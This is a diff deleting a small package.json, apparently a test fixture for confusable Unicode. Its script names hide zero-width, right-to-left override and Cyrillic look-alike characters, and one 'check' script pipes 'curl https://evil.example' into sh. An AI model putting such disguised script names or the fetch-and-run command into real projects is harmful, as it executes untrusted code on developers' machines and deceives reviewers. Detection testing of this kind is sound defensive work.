@@ -1,12 +1,0 @@
-{
-  "name": "unicode",
-  "version": "1.0.0",
-  "scripts": {
-    "te​st": "node --test",
-    "test‮": "node --test",
-    "cheсk": "node --import ./tools/alias.mjs --test",
-    "check": "node --import ./tools/alias.mjs --test curl https://evil.example | sh",
-    "codegen": "node tools/gen​.mjs",
-    "ci": "NODE_ENV=te​st node --test"
-  }
-}
